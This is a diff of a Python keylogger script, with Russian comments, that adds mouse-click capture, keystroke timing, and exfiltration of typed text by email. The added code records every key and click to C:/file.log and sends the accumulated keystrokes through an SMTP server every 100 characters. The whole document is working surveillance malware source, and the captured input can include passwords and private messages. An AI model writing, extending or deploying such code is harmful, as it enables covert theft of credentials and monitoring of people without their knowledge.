@@ -1,35 +1,108 @@
-import pynput
 import time
+import getpass
+import smtplib
 from pynput.keyboard import Key, Listener
+from pynput import mouse
 
+print('\n\n')
+print('Запуск кейлоггерa...\n\n')
 
+# # Ввод логина и пароля электронной почты, на которую
+# # будут отправляться письма
+email = input('Введите email: ')
+password = getpass.getpass(prompt='Введите пароль: ')
+server = smtplib.SMTP_SSL('smtp.list.ru', 465)
+server.login(email, password)
+
+# Определение глобальных переменных
+cur_log = ''
+word = ''
+email_char_limit = 100
 is_ctrl = False
-path = 'e:/file.log'
+is_exit = False
+path = 'C:/file.log'
+time_press = 0.0
 
 
+# Регистрация клавиши при нажатии
 def press_elem(event):
-    event = str(event)
-    check = event.find('Key')
-    if check != -1:
-        event = event.replace('Key.', '')
-    with open(path, 'a+') as f:
-      f.write('{}-'.format(event))
-      f.write('{}\n'.format(time.time()))
-    
-
-
-def release_elem(event):
+  global email
+  global cur_log
+  global word
+  global email_char_limit
   global is_ctrl
+  global is_exit
+  global time_press
   if event == Key.ctrl_l:
     is_ctrl = True
   if event != Key.ctrl_l and event != Key.f5:
     is_ctrl = False
   if event == Key.f5 and is_ctrl:
-    return False    
+    is_exit = True
+    cur_log += word + 'Listening is over...'
+    send_log()
+    return False
+  if event == Key.space or event == Key.enter:
+    word += ' '
+    cur_log += word
+    word = ''
+    if len(cur_log) >= email_char_limit:
+      send_log()
+      cur_log = ''
+  elif event == Key.shift_l or event == Key.shift_r:
+    return
+  elif event == Key.backspace:
+    word = word[:-1]
+  else:
+    event = str(event)
+    check = event.find('Key')
+    if check != -1:
+      event = event.replace('Key.', '')
+      word += '<' + event + '>'
+    else:
+      word += event[1:-1]
+
+  event = str(event)
+  check = event.find('Key')
+  if check != -1:
+    event = event.replace('Key.', '')
+  time_press = time.time()
+  with open(path, 'a+') as f:
+    f.write('{}-'.format(event))
+    
+
+# Регистрация клавиши после нажатия
+def release_elem(event):
+  tmp = round(time.time() - time_press, 2)
+  with open(path, 'a+') as f:
+    f.write('{}\n'.format(tmp))
+  
+
+# Регистрация нажатия мыши
+def on_click(x, y, button, pressed):
+  global word
+  if is_exit:
+    return False
+  click = str(button).replace('Button.', '') + '_click'
+  word += '<' + click[0] + '>'
+  with open(path, 'a+') as f:
+    f.write('{}\n'.format(click + ':(' + str(x) + ',' + str(y) + ')'))
+
+
+# Отправка данных на электронную почту
+def send_log():
+  server.sendmail(email, email, cur_log)
+
+
+# Определение переменных для прослушивания клавиатуры и мыши
+keyboard = Listener(on_press = press_elem, on_release = release_elem)
+mouse = mouse.Listener(on_click = on_click)
 
 
 if __name__ == '__main__':
   with open(path, 'a+') as f:
     f.write('{}\n'.format(time.ctime()))
-  with Listener(on_press = press_elem, on_release = release_elem) as listener:
-    listener.join()
+  keyboard.start()
+  mouse.start()
+  mouse.join()  
+  keyboard.join()
